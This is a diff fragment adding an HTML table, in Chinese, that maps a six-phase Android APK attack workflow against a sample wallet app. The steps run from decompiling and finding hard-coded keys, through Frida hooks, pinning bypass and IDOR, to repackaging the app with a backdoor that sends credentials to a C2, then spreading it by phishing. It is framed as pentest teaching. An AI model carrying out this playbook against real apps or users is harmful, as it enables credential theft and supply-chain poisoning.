+        <td><span class="dot" style="background:#4d96ff"></span>脱壳反编译</td>
+        <td>libnative-lib.so</td>
+        <td>JNI 函数表 / 算法实现 / 密钥来源</td>
+        <td>IDA / Ghidra 跟进 <code>getKey</code>，反编译出 "1234567890abcdef"</td>
+      </tr>
+      <tr>
+        <td><strong>2e</strong></td>
+        <td><span class="dot" style="background:#4d96ff"></span>脱壳反编译</td>
+        <td>二进制 AXML + resources.arsc</td>
+        <td>明文 manifest + 资源 + 可编辑 smali</td>
+        <td><code>apktool d</code> 生成可编辑 smali —— 后面重打包的手术台</td>
+      </tr>
+      <tr>
+        <td><strong>3a</strong></td>
+        <td><span class="dot" style="background:#ff922b"></span>代码审计</td>
+        <td>反编译源码 + strings</td>
+        <td>硬编码密钥 / 测试凭据 / 后端地址</td>
+        <td>grep 出 AES_KEY、test-admin-2023、SIGN_SALT、内网 BASE_URL</td>
+      </tr>
+      <tr>
+        <td><strong>3b</strong></td>
+        <td><span class="dot" style="background:#ff922b"></span>代码审计</td>
+        <td>exported 组件列表 + 源码</td>
+        <td>越权调用路径 / Intent 注入点</td>
+        <td>WebActivity 零校验加载任意 URL → 可被任意 App 唤起钓鱼</td>
+      </tr>
+      <tr>
+        <td><strong>3c</strong></td>
+        <td><span class="dot" style="background:#ff922b"></span>代码审计</td>
+        <td>CryptoUtil / 所有 Cipher 调用</td>
+        <td>算法缺陷清单 + 可预测性证明</td>
+        <td>发现 AES/ECB + 固定密钥 + new Random() → 可做字典攻击</td>
+      </tr>
+      <tr>
+        <td><strong>3d</strong></td>
+        <td><span class="dot" style="background:#ff922b"></span>代码审计</td>
+        <td>WebView 配置 + JavascriptInterface</td>
+        <td>JS → 原生能力的调用链 / RCE</td>
+        <td>bridge.exec(cmd) 直通 Shell；配合 3b = 一键 getshell</td>
+      </tr>
+      <tr>
+        <td><strong>3e</strong></td>
+        <td><span class="dot" style="background:#ff922b"></span>代码审计</td>
+        <td>App 私有目录</td>
+        <td>明文 token / 用户数据 / 日志泄露</td>
+        <td>SharedPreferences 明文 JWT、SQLite 未加密、日志打印密码</td>
+      </tr>
+      <tr>
+        <td><strong>3f</strong></td>
+        <td><span class="dot" style="background:#ff922b"></span>代码审计</td>
+        <td>网络栈配置 + OkHttp/HttpClient 调用</td>
+        <td>Pinning 存在性判定 / 抓包可行性</td>
+        <td>无 CertificatePinner、允许明文 → 装个证书即可全量抓包</td>
+      </tr>
+      <tr>
+        <td><strong>4a</strong></td>
+        <td><span class="dot" style="background:#cc5de8"></span>动态调试</td>
+        <td>root 设备 + frida-server + APK</td>
+        <td>可 hook 的运行环境</td>
+        <td>部署 frida-server、安装目标、打通注入通道</td>
+      </tr>
+      <tr>
+        <td><strong>4b</strong></td>
+        <td><span class="dot" style="background:#cc5de8"></span>动态调试</td>
+        <td>App 进程 + frida 脚本</td>
+        <td>明文凭据 / 密钥 / 业务参数</td>
+        <td>hook checkPassword 返回 true 直接登录；hook getKey 打印密钥</td>
+      </tr>
+      <tr>
+        <td><strong>4c</strong></td>
+        <td><span class="dot" style="background:#cc5de8"></span>动态调试</td>
+        <td>App 的检测逻辑</td>
+        <td>隐身运行的攻击环境</td>
+        <td>hook File.exists / frida 端口 / isDebuggerConnected 绕过检测</td>
+      </tr>
+      <tr>
+        <td><strong>4d</strong></td>
+        <td><span class="dot" style="background:#cc5de8"></span>动态调试</td>
+        <td>运行中的 App 内存</td>
+        <td>解密后的密钥 / token / 用户数据</td>
+        <td>读 SharedPreferences 全量；fridump 扫内存拿到明文密钥</td>
+      </tr>
+      <tr>
+        <td><strong>5a</strong></td>
+        <td><span class="dot" style="background:#20c997"></span>流量劫持</td>
+        <td>App 的全部网络流量</td>
+        <td>完整 HTTPS 请求 / 响应明文</td>
+        <td>mitmproxy + CA 证书装入系统信任区（Android 7+ 必需 root）</td>
+      </tr>
+      <tr>
+        <td><strong>5b</strong></td>
+        <td><span class="dot" style="background:#20c997"></span>流量劫持</td>
+        <td>带证书固定的 App</td>
+        <td>被解除的证书校验</td>
+        <td>一条脚本同时覆盖 TrustManagerImpl / OkHttp / WebViewClient</td>
+      </tr>
+      <tr>
+        <td><strong>5c</strong></td>
+        <td><span class="dot" style="background:#20c997"></span>流量劫持</td>
+        <td>原始合法请求</td>
+        <td>他人数据 / 被篡改的业务结果</td>
+        <td>改 userId 10086→10087 即拿到他人余额与身份证 → 水平越权</td>
+      </tr>
+      <tr>
+        <td><strong>5d</strong></td>
+        <td><span class="dot" style="background:#20c997"></span>流量劫持</td>
+        <td>带签名的加密请求</td>
+        <td>签名算法 + 盐值 → 可任意伪造请求</td>
+        <td>还原 <code>md5(userId+ts+"S3cr3t_S@lt")</code> → 可伪造任意请求</td>
+      </tr>
+      <tr>
+        <td><strong>6a</strong></td>
+        <td><span class="dot" style="background:#ffd93d"></span>重打包投毒</td>
+        <td>decoded/smali 源码</td>
+        <td>带后门的 smali</td>
+        <td>插入 Payload.init()，凭据静默回传 C2，原功能完全正常</td>
+      </tr>
+      <tr>
+        <td><strong>6b</strong></td>
+        <td><span class="dot" style="background:#ffd93d"></span>重打包投毒</td>
+        <td>修改后的 smali + 资源</td>
+        <td>未签名的新 APK</td>
+        <td><code>apktool b</code> 回编译 + <code>zipalign</code> 对齐</td>
+      </tr>
+      <tr>
+        <td><strong>6c</strong></td>
+        <td><span class="dot" style="background:#ffd93d"></span>重打包投毒</td>
+        <td>未签名 APK</td>
+        <td>可安装的仿冒 APK</td>
+        <td>自签 evil.jks；若 App 自校验则 hook getPackageInfo 返回原签名</td>
+      </tr>
+      <tr>
+        <td><strong>6d</strong></td>
+        <td><span class="dot" style="background:#ffd93d"></span>重打包投毒</td>
+        <td>仿冒 APK</td>
+        <td>大规模用户凭据 / 供应链投毒</td>
+        <td>第三方市场 / 钓鱼短信投递，用户无感 —— 技术漏洞变成真实伤害</td>
+      </tr>
+      <tr>
+        <td><strong>★</strong></td>
+        <td><span class="dot" style="background:#ffd93d"></span>终点</td>
+        <td>六阶段全部产出</td>
+        <td>凭据 / 数据 / 接口 / 内网 / 用户</td>
+        <td>密钥 + 凭据 + 接口 + 内网 + 全量用户 → 越权拖库、资金篡改、供应链投毒</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="footer">
+  Android APK 攻击全流程 · 六阶段 29 步 · 贯穿样本 demo-wallet.apk<br>
+  ⚠️ 本图仅用于<strong>授权渗透测试与安全评估</strong>教学。未授权攻击他人应用系统将承担法律责任。
+</div>
+
+</body>
+</html>
